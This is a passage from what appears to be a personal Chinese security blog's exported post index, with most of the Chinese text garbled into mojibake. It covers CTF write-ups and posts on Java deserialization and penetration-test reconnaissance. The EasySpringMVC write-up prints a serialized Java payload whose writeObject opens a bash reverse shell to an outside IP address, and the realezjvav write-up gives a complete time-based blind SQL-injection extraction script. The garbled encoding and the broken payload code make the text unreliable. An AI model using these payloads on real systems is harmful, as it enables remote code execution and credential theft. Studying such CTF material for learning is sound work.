closeReferer: http://9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cn/admin.php?mod=mobanCookie: UM_distinctid=178395fbb40cc-02783c99f63357-4c3f227c-1fa400-178395fbb417c4; PHPSESSID=pgqota5okm9rgj7s3oammmvu14Upgrade-Insecure-Requests: 1è¿™é‡Œ3.txtè·¯å¾„æ˜¯å¯ä»¥åœ¨ä¸Šä¼ ç•Œé¢è·å¾—çš„å‚è€ƒï¼šhttps://nikoeurus.github.io/2019/10/14/RoarCTF/#%E5%90%8E%E5%8F%B0getshellhttps://blog.csdn.net/mochu7777777/article/details/107550135https://guokeya.github.io/post/zE_m1kHQm/ è¿˜æ˜¯å¾—å¤šåˆ†ææºç æ‰èƒ½è¿›æ­¥ã€‚ [V&amp;N2020 å…¬å¼€èµ›]EasySpringMVCå…³é”®è¯ï¼šJavaååºåˆ—åŒ–Javaååºåˆ—åŒ–æ²¡æ€ä¹ˆä»”ç»†ç ”ç©¶è¿‡ è¿™ä¸¤æ¬¡æ¯”èµ›åƒäº†å¾ˆå¤§çš„äºæ€»ç»“ä¸€ç¯‡åšå®¢å­¦ä¹ ä¸€ä¸‹ è§ Javaååºåˆ—åŒ–å­¦ä¹ .mdhttp://1cd4a2bb-5036-4365-be52-3f7b33bbb5b8.node3.buuoj.cn/springmvcdemo/showpic.form?file=showpic.jspä¸Šä¼ å›¾ç‰‡ç‚¹ éœ€è¦webmanagerç»„æƒé™ fileå‚æ•°å°è¯•ä»»æ„æ–‡ä»¶è¯»å–æ˜¾ç¤ºonly show you picture file !ï¼ˆå¤±è´¥å¼€å§‹å®¡æºç ï¼Œæ‹–åˆ°jdguié‡Œé¦–å…ˆçœ‹web.xmlã€‚ï¼ˆweb.xmlæ˜¯J2EEå®šä¹‰çš„æè¿°è¿™ä¸ªwebappçš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œéå¸¸é‡è¦ã€‚ï¼‰ &lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt; contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener clientinfo com.filters.ClentInfoFilter clientinfo dispatcher org.springframework.web.servlet.DispatcherServlet 1 dispatcher .form å…ˆçœ‹æœ€ä¸‹é¢ä¸€æ®µï¼š dispatcher .form è¯¥é…ç½®æ–‡ä»¶ç”¨servlet-mappingæŒ‡æ˜æ‰€æœ‰.formæ ¼å¼è·¯å¾„çš„è®¿é—®äº¤ç»™åä¸ºdispatcherçš„servletå¤„ç†ã€‚servletå°±æ˜¯å¤„ç†HTTPè¯·æ±‚çš„æ ¸å¿ƒç±»ã€‚ dispatcher org.springframework.web.servlet.DispatcherServlet 1 å†çœ‹è¿™ä¸€æ®µï¼Œè¡¨æ˜è¿™ä¸ªdispatcher servletæ˜¯ä¸€ä¸ªorg.springframework.web.servlet.DispatcherServletï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªwebappä½¿ç”¨äº†Springæ¡†æ¶ã€‚æ¯”è¾ƒæœ‰è¶£çš„æ˜¯è¿˜å®šä¹‰äº†ä¸€ä¸ªfilterã€‚ clientinfo com.filters.ClentInfoFilter clientinfo * è¿™æ®µä»£ç è¡¨ç¤ºï¼Œå¯¹æ‰€æœ‰servletçš„è®¿é—®ï¼Œéƒ½éœ€è¦ç»è¿‡com.filters.ClentInfoFilterç±»ã€‚filterçš„ä½œç”¨ä¸€èˆ¬æ˜¯åœ¨HTTPè¯·æ±‚åˆ°è¾¾servletä¹‹å‰æˆ–ä¹‹åï¼Œå¯¹HTTPè¯·æ±‚æˆ–å“åº”è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚æ£€æŸ¥è¿™ä¸ªè¯·æ±‚æ˜¯å¦æ‹¥æœ‰æƒé™ã€‚controllerç±»WPç›´æ¥ä¸€å¥è¯å¸¦è¿‡è¯´æ²¡æœ‰æœ‰é—®é¢˜çš„åœ°æ–¹ï¼Œå½“ç„¶æˆ‘ä»¬å­¦ä¹ çš„è¿˜æ˜¯å¾—è‡ªå·±çœ‹ä¸€éã€‚åªæœ‰showç±»é‡Œé¢æœ‰ä¸ªåºåˆ—åŒ– åˆ«çš„åœ°æ–¹ uploadä¸ç”¨çœ‹ indexé‡Œé¢å°±æ˜¯ä¸€äº›åˆ¤æ–­ã€‚æ¥ä¸‹æ¥çœ‹ä¸Šé¢æåˆ°çš„filter if (cookies != null) for (Cookie c : cookies) { if (c.getName().equals(â€œcinfoâ€)) { exist = true; cookie = c; break; } }å¯ä»¥çœ‹åˆ°filteré¦–å…ˆä»ä¼—å¤šcookiesä¸­æ‰¾åˆ°è¿™ä¸ªcinfoè¿™ä¸ªcookieã€‚ç„¶åä¸‹é¢æœ‰ï¼šbytes = Tools.create(cinfo);è·Ÿè¿›Toolsç±»ï¼ŒèŠœæ¹–ï¼ï¼š private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } }Toolså¯¹è¿™ä¸ªå­—èŠ‚æ•°ç»„ç›´æ¥readObjectï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å®¢æˆ·ç«¯æäº¤çš„æ•°æ®ï¼ŒæœåŠ¡å™¨æ— æ¡ä»¶ä¿¡ä»»ï¼Œå¹¶ååºåˆ—åŒ–ã€‚Javaçš„ååºåˆ—åŒ–å’ŒPHPååºåˆ—åŒ–ç±»ä¼¼ï¼Œphpåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨å¯¹åº”ç±»çš„__wakeup()å‡½æ•°ï¼Œè€Œjavaä¼šè°ƒç”¨è¯¥ç±»readObject()å‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªToolsç±»ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒreadObjectä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œç„¶åè¯»åˆ°çš„objä¼šè¢«å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºString[]ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚ç”±äºååºåˆ—åŒ–çš„æ—¶å€™è¯»å–çš„å¯¹è±¡ç›´æ¥è¢«ä¼ å…¥Processbuilderï¼Œæˆ‘ä»¬åœ¨Toolsç±»å†…é‡å†™writeObjectæ–¹æ³•ï¼Œç›´æ¥å°†å‘½ä»¤å†™å…¥ã€‚ Tools.class package com.tools;//ä¸€å®šè¦è¿™ä¸ªåŸæ–‡ä»¶åŒåçš„è·¯å¾„ import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); outputStream.writeObject(obj); outputStream.writeObject(obj); return bos.toByteArray(); outputStream.writeObject(obj); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException { String[] cmd={&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i&gt;&amp; /dev/tcp/121.196.169.53/3333 0&gt;&amp;1&quot;}; out.writeObject(cmd); } } example3_1.class package example; import com.tools.Tools; import java.util.Base64; public class example3_1 { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } } } [VNCTF 2021]realezjvavWPè¯´ç¬›å¡å°”ç§¯ç›²æ³¨ æˆ‘åä¸ä¿¡ è¯•äº†ä¸‹åˆ«çš„æ–¹æ³• éƒ½ä¸è¡Œ å¥½å§ wsfwå…¶å®åœ¨æ³¨é‡Šé‡Œå·²ç»å†™äº†both username and password are right , then you can enter the next levelæ‰€ä»¥ä¸èƒ½admin\\è¿™ç§ã€‚åŒæ—¶sleep benchmarkéƒ½è¢«è¿‡æ»¤ è€Œä¸”æ²¡æœ‰å›æ˜¾ å¿…é¡»ç›²æ³¨ åªèƒ½ç¬›å¡å°”ç§¯è¯•è¯•äº†ã€‚åŸç†ï¼šSELECT count() FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;æ ¹æ®æ•°æ®åº“æŸ¥è¯¢çš„ç‰¹ç‚¹ï¼Œè¿™å¥è¯çš„æ„æ€å°±æ˜¯å°† A B C ä¸‰ä¸ªè¡¨è¿›è¡Œç¬›å¡å°”ç§¯ï¼ˆå…¨æ’åˆ—ï¼‰ï¼Œå¹¶è¾“å‡º æœ€ç»ˆçš„è¡Œæ•°ï¼Œæ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼šæ‰§è¡Œæ•ˆæœæ˜¯è·‘äº†ååˆ†é’Ÿéƒ½æ²¡è·‘å‡ºæ¥ ç½‘ä¸Šçœ‹äº†åº”è¯¥æ˜¯ count() å…­åƒå¤šä¸‡å…‰ä¸€ä¸ªè¡¨çš„è¯æ˜¯ä¸‰åƒå¤š ä¸€ä¸‹å­å°±èƒ½å‡ºæ¥ã€‚é‚£ä¹ˆåˆ©ç”¨åŸç†å°±æ˜¯æ ¹æ®å›æ˜¾é€Ÿåº¦æ³¨å…¥ å’Œæ—¶é—´ç›²æ³¨ä¸€ä¸ªåŸç†(å½“ç„¶å›æ˜¾é€Ÿåº¦éœ€è¦å¯¹payloadè¿›è¡Œè°ƒæ•´)å®˜æ–¹exp: import requests import time url = â€œhttp://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/user/loginâ€ i = 0 flag = â€œâ€ while True : i += 1 head = 32 tail = 126 while head &lt; tail : mid = head + tail &gt;&gt; 1 payload = â€œaâ€™ or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT//count(*)//FROM//information_schema.tables//A,information_schema.columns//B,information_schema.tables//C),1))#â€ % (i,mid) data = {â€œusernameâ€:â€adminâ€ , â€œpasswordâ€ : payload} start_time = time.time() r = requests.post(url,data = data) print(data[â€˜passwordâ€™]) end_time = time.time() if end_time - start_time &gt; 3: head = mid + 1 else : tail = mid if head!=32: flag += chr(head) print(flag) else: breakæ³¨çš„å¾ˆæ…¢ å› ä¸ºé‚£è¯­å¥å¤§æ¦‚è¦æ‰§è¡Œ6ç§’é’Ÿå¯†ç no_0ne_kn0w_th1sè¿›å»æ˜¯åˆ›å»ºè§’è‰²ï¼ŒæŸ¥çœ‹å›¾ç‰‡è·¯å¾„ï¼šhttp://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/searchimage?img=2.pngæ€€ç–‘å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“è¦è¯»ä»€ä¹ˆ è‡ªå·±éšä¾¿è¯•äº†ä¸€ä¸‹ï¼š../../../../../../web.xmlä¸è¡Œï¼ŒæŸ¥çœ‹wpï¼šsearchimage?img=../../../../../pom.xmlï¼Ÿè¯´æ˜¯Springé‡Œé¢pom.xmlæ”¾äº†å¤–éƒ¨ä¾èµ–ï¼Œéº»äº†ã€‚çœ‹åˆ°fastjson com.alibaba fastjson 1.2.27 rceï¼šhttps://github.com/CaijiOrz/fastjson-1.2.47-RCEï¼›https://y4tacker.blog.csdn.net/article/details/114949206flag_no_one_know_abccba.txtå¤ç°è¿˜ç®—ç®€å•ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"BUU WebWP","slug":"BUU-WebWP","date":"2021-03-28T12:41:50.000Z","updated":"2021-03-28T12:43:59.595Z","comments":true,"path":"2021/03/28/BUU-WebWP/","link":"","permalink":"/2021/03/28/BUU-WebWP/","excerpt":"","text":"BUUä»¥å‰åšçš„Webåˆé›†ï¼šhttps://github.com/ITroyeSivan/BUUWebWP","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[{"name":"BUU","slug":"BUU","permalink":"/tags/BUU/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Javaååºåˆ—åŒ–å­¦ä¹ ","slug":"Javaååºåˆ—åŒ–å­¦ä¹ ","date":"2021-03-25T08:03:39.000Z","updated":"2021-03-25T08:05:24.020Z","comments":true,"path":"2021/03/25/Javaååºåˆ—åŒ–å­¦ä¹ /","link":"","permalink":"/2021/03/25/Javaååºåˆ—åŒ–å­¦ä¹ /","excerpt":"","text":"è¿™å‡ å¤©åšäº†å¾ˆå¤šé¢˜ ç»éªŒæ€»ç»“ä¸€å¥è¯å°±æ˜¯ï¼šè¦å¤šåˆ†ææºç ã€‚Javaä¸€ç›´æ²¡å»æ·±å…¥ç ”ç©¶ æ¯”èµ›çš„æ—¶å€™è‡ªå·±æ ¹æœ¬æ²¡æ³•åš è¿˜æ˜¯è¿ç»­ä¸¤åœºéƒ½ç¢°ä¸Š éå¸¸åæ‚” ä»ä»Šå¾€ååˆ†æå¹³å°æºç ä¹Ÿå¾—åŠ å…¥æ¯æ—¥å­¦ä¹ å†…å®¹äº†ã€‚è¿›å…¥æ­£æ–‡â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Javaååºåˆ—åŒ–æœ‰å•¥ç”¨?1)æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼›2)åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ— Javaä¸­çš„APIå®ç° Java.io.ObjectOutputStream&amp;&amp;Java.io.ObjectInputStream ObjectOutputStreamç±» â€“&gt; writeObject()è¯¥æ–¹æ³•å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ï¼ŒæŒ‰Javaçš„æ ‡å‡†çº¦å®šæ˜¯ç»™æ–‡ä»¶ä¸€ä¸ª.seræ‰©å±•åã€‚æƒ³èµ·æ¥å‰å‡ å¤©è¡¥è€ƒJavaæ‰åˆšå­¦è¿‡hhhæ‰“å¼€eclipseè¯•ä¸€ä¸‹ï¼š package example; import java.io.*; public class example3_1{ public static void main(String args[]) throws Exception{ String obj = &quot;emt&quot;; // å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶object.txtä¸­ FileOutputStream fos = new FileOutputStream(&quot;troy3e.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // ä»æ–‡ä»¶object.txtä¸­è¯»å–æ•°æ® FileInputStream fis = new FileInputStream(&quot;troy3e.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // é€šè¿‡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡obj String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); } } å…ˆé€šè¿‡è¾“å…¥æµåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†è°ƒç”¨ObjectOutputStreamç±»çš„ writeObjectæ–¹æ³•æŠŠåºåˆ—åŒ–çš„æ•°æ®å†™å…¥è¯¥æ–‡ä»¶;ç„¶åè°ƒç”¨ObjectInputStreamç±»çš„readObjectæ–¹æ³•ååºåˆ—åŒ–æ•°æ®å¹¶æ‰“å°æ•°æ®å†…å®¹ã€‚å¯¹äºç±»çš„è¯ å®ç°Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚ï¼ˆclass Troy3e implements Serializableï¼‰ æ¼æ´äº§ç”ŸåŸå› ä¸PHPååºåˆ—åŒ–æ˜¯ä¸€ä¸ªé“ç†ï¼Œå¦‚æœJavaåº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥ï¼Œå³ä¸å¯ä¿¡æ•°æ®åšäº†ååºåˆ—åŒ–å¤„ç†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œéé¢„æœŸçš„å¯¹è±¡åœ¨äº§ç”Ÿè¿‡ç¨‹ä¸­å°±æœ‰å¯èƒ½å¸¦æ¥ä»»æ„ä»£ç æ‰§è¡Œã€‚ å®æˆ˜åˆ†æä¸€ã€[V&amp;N2020 å…¬å¼€èµ›]EasySpringMVCWPæœ¬åœ°è®°å½•ã€‚äºŒã€NepCTFWPæœ¬åœ°è®°å½•ã€‚ æŒç»­æ›´æ–°ã€‚PSï¼šWPä»¥åä¼šåšä¸€ä¸ªåˆé›†ï¼Œä¸å†å•å‘æ°´åšå®¢ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"åšå®¢æš‚æ—¶åœæ›´","slug":"WPæš‚æ—¶åœæ›´","date":"2021-03-16T03:17:25.000Z","updated":"2021-03-17T12:27:25.617Z","comments":true,"path":"2021/03/16/WPæš‚æ—¶åœæ›´/","link":"","permalink":"/2021/03/16/WPæš‚æ—¶åœæ›´/","excerpt":"","text":"æ¥ä¸‹æ¥å¾ˆé•¿ä¸€æ®µæ—¶é—´å¼€å§‹çˆ†è‚å­¦ä¹ æ¨¡å¼ã€‚ç”±äºåˆ·é¢˜è¾ƒå¤šå’Œæ›´æ–°åšå®¢æ¯”è¾ƒè€—è´¹æ—¶é—´çš„é—®é¢˜ WPæ”¹ä¸ºæœ¬åœ°è®°å½•ã€‚ç­‰ä»€ä¹ˆæ—¶å€™èƒ½æ‹¿å‡ºæˆç»©äº†æ¢å¤æ›´æ–°ã€‚ï¼ˆä¸å½±å“æŠ€æœ¯åšå®¢Troy3e 2021/3/16","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"æ¸—é€æµ‹è¯•ä¹‹ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•ä¹‹ä¿¡æ¯æ”¶é›†","date":"2021-03-13T05:42:09.000Z","updated":"2021-03-13T07:24:59.278Z","comments":true,"path":"2021/03/13/æ¸—é€æµ‹è¯•ä¹‹ä¿¡æ¯æ”¶é›†/","link":"","permalink":"/2021/03/13/æ¸—é€æµ‹è¯•ä¹‹ä¿¡æ¯æ”¶é›†/","excerpt":"","text":"#ä¿¡æ¯æ”¶é›† ä¿¡æ¯æ”¶é›†çš„æ–¹å¼å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šä¸»åŠ¨å’Œè¢«åŠ¨ã€‚ä¸»åŠ¨ä¿¡æ¯æ”¶é›†ï¼šé€šè¿‡ç›´æ¥è®¿é—®ã€æ‰«æç½‘ç«™ï¼Œè¿™ç§æµé‡å°†æµç»ç½‘ç«™è¢«åŠ¨ä¿¡æ¯æ”¶é›†ï¼šåˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æœåŠ¡å¯¹ç›®æ ‡è¿›è¡Œè®¿é—®äº†è§£ï¼Œæ¯”ä¾‹ï¼šGoogleæœç´¢ã€Shodanæœç´¢ç­‰.Google Hackingçš„ç”¨æ³•:https://blog.csdn.net/qq_36119192/article/details/84029809Shodançš„åŸºæœ¬ä½¿ç”¨:https://blog.csdn.net/qq_36119192/article/details/84031765 #åŸŸåä¿¡æ¯çš„æ”¶é›† å½“æˆ‘ä»¬ç¡®å®šäº†è¦æ¸—é€çš„ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯çŸ¥é“äº†å…¶åŸŸåï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ”¶é›†åŸŸåå¯¹åº”çš„ ipï¼ŒåŸŸåçš„whoisä¿¡æ¯ã€å­åŸŸåç­‰ç­‰ä¸€ç³»åˆ—ä¸åŸŸåç›¸å…³çš„ä¿¡æ¯ã€‚ åˆ¤æ–­åŸŸåå¯¹åº”çš„IPï¼šé¦–å…ˆï¼Œæˆ‘ä»¬è¦åˆ¤æ–­è¯¥åŸŸåæ˜¯å¦å­˜åœ¨CDNçš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å»åœ¨çº¿CDNæŸ¥è¯¢ç½‘ç«™ï¼šhttp://ping.chinaz.com/ ã€‚å¦‚æœæŸ¥è¯¢å‡ºçš„ipæ•°é‡å¤§äºä¸€ä¸ªçš„è¯ï¼Œåˆ™è¯´æ˜è¯¥ipåœ°å€ä¸æ˜¯çœŸå®çš„æœåŠ¡å™¨åœ°å€ã€‚ä»¥æˆ‘çš„ç»éªŒæ¥çœ‹ï¼Œå¦‚æœæ˜¯2ä¸ªæˆ–è€…3ä¸ªï¼Œå¹¶ä¸”è¿™å‡ ä¸ªåœ°å€æ˜¯åŒä¸€åœ°åŒºçš„ä¸åŒè¿è¥å•†çš„è¯ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½è¿™å‡ ä¸ªåœ°å€æ˜¯æœåŠ¡å™¨çš„å‡ºå£åœ°å€ï¼Œè¯¥æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œé€šè¿‡ä¸åŒè¿è¥å•†NATæ˜ å°„ä¾›äº’è”ç½‘è®¿é—®ï¼ŒåŒæ—¶é‡‡ç”¨å‡ ä¸ªä¸åŒçš„è¿è¥å•†å¯ä»¥è´Ÿè½½å‡è¡¡å’Œçƒ­å¤‡ä»½ã€‚å¦‚æœæ˜¯å¤šä¸ªipåœ°å€ï¼Œå¹¶ä¸”è¿™äº›ipåœ°å€åˆ†å¸ƒåœ¨ä¸åŒåœ°åŒºçš„è¯ï¼Œåˆ™åŸºæœ¬ä¸Šå¯ä»¥æ–­å®šå°±æ˜¯é‡‡ç”¨äº†CDNäº†ã€‚é‚£ä¹ˆå¦‚ä½•ç»•è¿‡CDNæŸ¥æ‰¾ç½‘ç«™çœŸå®çš„ipåœ°å€å‘¢ï¼Ÿ åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œç»å¸¸ä¼šç¢°åˆ°ç½‘ç«™æœ‰CDNçš„æƒ…å†µã€‚CDNå³å†…å®¹åˆ†å‘ç½‘ç»œï¼Œä¸»è¦è§£å†³å› ä¼ è¾“è·ç¦»å’Œä¸åŒè¿è¥å•†èŠ‚ç‚¹é€ æˆçš„ç½‘ç»œé€Ÿåº¦æ€§èƒ½ä½ä¸‹çš„é—®é¢˜ã€‚è¯´çš„ç®€å•ç‚¹ï¼Œå°±æ˜¯ä¸€ç»„åœ¨ä¸åŒè¿è¥å•†ä¹‹é—´çš„å¯¹æ¥ç‚¹ä¸Šçš„é«˜é€Ÿç¼“å­˜æœåŠ¡å™¨ï¼ŒæŠŠç”¨æˆ·ç»å¸¸è®¿é—®çš„é™æ€æ•°æ®èµ„æºç›´æ¥ç¼“å­˜åˆ°èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šï¼Œå½“ç”¨æˆ·å†æ¬¡è¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥åˆ†å‘åˆ°ç¦»ç”¨æˆ·è¿‘çš„èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šå“åº”ç»™ç”¨æˆ·ï¼Œå½“ç”¨æˆ·æœ‰å®é™…æ•°æ®äº¤äº’æ—¶æ‰ä¼šä»è¿œç¨‹WebæœåŠ¡å™¨ä¸Šå“åº”ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜ç½‘ç«™çš„å“åº”é€Ÿåº¦åŠç”¨æˆ·ä½“éªŒã€‚ å¦‚ä½•åˆ¤æ–­ç½‘ç«™æ˜¯å¦æœ‰CDNï¼Ÿ å¾ˆç®€å•ï¼Œä½¿ç”¨ä¸åŒåœ°æ–¹çš„ ping æœåŠ¡ï¼ŒæŸ¥çœ‹å¯¹åº” IP åœ°å€æ˜¯å¦å”¯ä¸€ï¼Œå¦‚æœä¸å”¯ä¸€åˆ™ææœ‰å¯èƒ½æ˜¯ä½¿ç”¨äº†CDN #ç»•è¿‡CDNæŸ¥æ‰¾ç½‘ç«™çœŸå®ip (1)æŸ¥è¯¢å­åŸŸåï¼šæ¯•ç«Ÿ CDN è¿˜æ˜¯ä¸ä¾¿å®œçš„ï¼Œæ‰€ä»¥å¾ˆå¤šç«™é•¿å¯èƒ½åªä¼šå¯¹ä¸»ç«™æˆ–è€…æµé‡å¤§çš„å­ç«™ç‚¹åšäº† CDNï¼Œè€Œå¾ˆå¤šå°ç«™å­ç«™ç‚¹åˆè·Ÿä¸»ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨æˆ–è€…åŒä¸€ä¸ªCæ®µå†…ï¼Œæ­¤æ—¶å°±å¯ä»¥é€šè¿‡æŸ¥è¯¢å­åŸŸåå¯¹åº”çš„ IP æ¥è¾…åŠ©æŸ¥æ‰¾ç½‘ç«™çš„çœŸå®IPã€‚ æŸ¥è¯¢å­åŸŸåæœ‰ä¸‰ç§æ–¹æ³•ï¼š 1ã€é€šè¿‡çˆ†ç ´å­åŸŸåè¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚ Layerå­åŸŸåçˆ†ç ´æœºã€subDomainBruteï¼Œåœ¨çº¿å­åŸŸåæŸ¥è¯¢ç½‘ç«™ï¼šhttps://phpinfo.me/domain/ 2ã€é€šè¿‡æŸ¥è¯¢DNSæœåŠ¡å™¨ï¼ŒæŸ¥è¯¢è¯¥åŸŸä¸‹çš„è§£æè®°å½• 3ã€é€šè¿‡HTTPSè¯ä¹¦æ¥æŸ¥è¯¢(åªé€‚ç”¨äºhttpsç½‘ç«™) ï¼Œå¦‚ï¼šhttps://crt.sh/ å°±æ˜¯é€šè¿‡httpsè¯ä¹¦æŸ¥è¯¢å­åŸŸå 4ã€é€šè¿‡googleæŸ¥è¯¢ ï¼ˆ1ï¼‰Layerå­åŸŸåçˆ†ç ´æœº Layeræ˜¯windowsä¸‹çš„ä¸€æ¬¾å­åŸŸåæ¢æµ‹å·¥å…·ï¼Œå…¶å·¥ä½œåŸç†æ˜¯åˆ©ç”¨å­åŸŸåå­—å…¸è¿›è¡Œçˆ†ç ´ï¼Œä½¿ç”¨ç®€å•å®¹æ˜“ä¸Šæ‰‹ã€‚ ï¼ˆ2ï¼‰subDomainBrute subDomainBruteçš„ç‰¹ç‚¹æ˜¯å¯ä»¥ç”¨å°å­—å…¸é€’å½’çš„å‘ç°ä¸‰çº§åŸŸåã€å››çº§åŸŸåã€ç”šè‡³äº”çº§åŸŸåç­‰ä¸å®¹æ˜“è¢«æ¢æµ‹åˆ°çš„åŸŸåã€‚ å­—å…¸è¾ƒä¸ºä¸°å¯Œï¼Œå°å­—å…¸å°±åŒ…æ‹¬1ä¸‡5åƒæ¡ï¼Œå¤§å­—å…¸å¤šè¾¾6ä¸‡3åƒæ¡ é»˜è®¤ä½¿ç”¨114DNSã€ç™¾åº¦DNSã€é˜¿é‡ŒDNSè¿™å‡ ä¸ªå¿«é€Ÿåˆå¯é çš„Public DNSæŸ¥è¯¢ï¼Œå¯ä¿®æ”¹é…ç½®æ–‡ä»¶æ·»åŠ DNSæœåŠ¡å™¨ï¼ˆåœ¨dicté‡Œé¢å¯ä»¥è¿›è¡Œæ·»åŠ ï¼‰ è‡ªåŠ¨å»é‡æ³›è§£æçš„åŸŸåï¼Œå½“å‰è§„åˆ™ï¼š è¶…è¿‡2ä¸ªåŸŸåæŒ‡å‘åŒä¸€IPï¼Œåˆ™æ­¤åå‘ç°çš„å…¶ä»–æŒ‡å‘è¯¥IPçš„åŸŸåå°†è¢«ä¸¢å¼ƒ æˆ‘è¿™é‡Œå°±æ˜¯ä½¿ç”¨çš„subDomainBruteï¼š å› ä¸ºå­—å…¸å¾ˆå¤§ï¼Œæ‰€ä»¥é€Ÿåº¦æœ‰ç‚¹æ…¢ ï¼ˆ3ï¼‰åˆ©ç”¨googleæŸ¥è¯¢ æŒ‡å®šç«™ç‚¹ï¼Œç„¶å-å°±æ˜¯ä¸åŒ…å«è¿™ä¸ªï¼Œæ¥æŸ¥è¯¢ site:baidu.com -www (2)æŸ¥è¯¢ä¸»åŸŸåï¼šä»¥å‰ç”¨CDNçš„æ—¶å€™æœ‰ä¸ªä¹ 